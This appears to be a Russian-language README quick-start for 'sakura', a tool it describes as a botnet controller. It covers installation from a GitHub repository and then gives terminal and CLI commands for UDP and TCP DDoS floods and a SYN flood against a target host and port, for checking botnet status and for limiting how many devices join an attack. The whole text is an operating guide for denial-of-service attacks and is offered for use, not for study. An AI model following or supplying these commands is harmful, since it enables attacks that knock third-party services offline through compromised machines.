## Быстрый старт
### Установка
> [!WARNING]
> Установите python 3.12+ перед запуском
```
git clone https://github.com/i4ego/sakura.git
cd sakura
python3 -m pip install -r req.txt
```
## Использование
### Как терминал
Запустите: `python3 sakura.py`
###### DDOS example.com:443 по протоколу UDP
```.ddos udp example.com 443```
###### SYN-флуд example.com
```.sflood example.com```
###### Показать статус ботнета
```.status```
###### DDOS example.com:443 по протоколу TCP (максимум - 15 устройств в атаке)
```.ddos tcp example.com 443 15```
### CLI
###### DDOS example.com:443 по протоколу UDP
```python3 sakura.py DDOS UDP example.com 443```
###### SYN-флуд example.com
```python3 sakura.py SYNFLOOD example.com```
###### Показать статус ботнета
```python3 sakura.py STATUS```
###### DDOS example.com:443 по протоколу TCP (максимум - 15 устройств в атаке)
```python3 sakura.py DDOS TCP example.com 443 15```
